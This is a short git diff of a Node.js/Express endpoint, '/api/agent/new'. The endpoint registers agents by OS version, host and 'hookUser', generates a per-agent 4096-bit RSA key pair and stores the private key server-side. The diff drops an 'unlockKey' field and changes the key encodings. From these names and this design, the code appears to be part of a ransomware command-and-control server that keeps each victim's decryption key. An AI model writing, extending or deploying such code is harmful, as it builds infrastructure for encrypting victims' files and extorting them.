@@ -60,19 +60,18 @@ app.post('/api/agent/new', (req, res) => {
     req.body != undefined &&
     req.body.versionOS != undefined &&
     req.body.host != undefined &&
-    req.body.hookUser != undefined &&
-    req.body.unlockKey != undefined
+    req.body.hookUser != undefined
   ) {
 
     // Generate RSA key pair
     const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
       modulusLength: 4096,
       publicKeyEncoding: {
-        type: 'spki',
+        type: 'pkcs1',
         format: 'pem'
       },
       privateKeyEncoding: {
-        type: 'pkcs8',
+        type: 'pkcs1',
         format: 'pem'
       }
     });
@@ -80,8 +79,8 @@ app.post('/api/agent/new', (req, res) => {
     const publicKeyStr = publicKey.toString();
 
     // Insert data into MySQL
-    const sql = `INSERT INTO agent (versionOS, host, hookUser, unlockKey, privKey, pubKey) VALUES (?, ?, ?, ?, ?, ?)`;
-    const values = [req.body.versionOS, req.body.host, req.body.hookUser, req.body.unlockKey, privateKey.toString(), publicKeyStr];
+    const sql = `INSERT INTO agent (versionOS, host, hookUser, privKey, pubKey) VALUES (?, ?, ?, ?, ?)`;
+    const values = [req.body.versionOS, req.body.host, req.body.hookUser, privateKey.toString(), publicKeyStr];
 
     // Insert data into MySQL without keys
     db.query(sql, values, (err, result) => {
